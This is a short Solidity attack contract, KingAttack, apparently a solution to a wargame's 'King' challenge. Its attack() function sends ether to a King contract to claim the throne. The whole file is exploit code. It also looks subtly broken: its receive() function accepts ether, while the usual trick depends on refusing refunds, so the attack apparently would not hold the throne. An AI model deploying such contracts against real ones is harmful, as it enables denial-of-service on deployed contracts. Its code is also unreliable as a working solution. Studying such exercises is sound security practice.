// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract KingAttack {
    King king;

    constructor(address payable _kingContractAddress) public {
        king = King(_kingContractAddress);
    }

    function attack() public payable {
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "King call failed");
    }

    receive() external payable {}
}
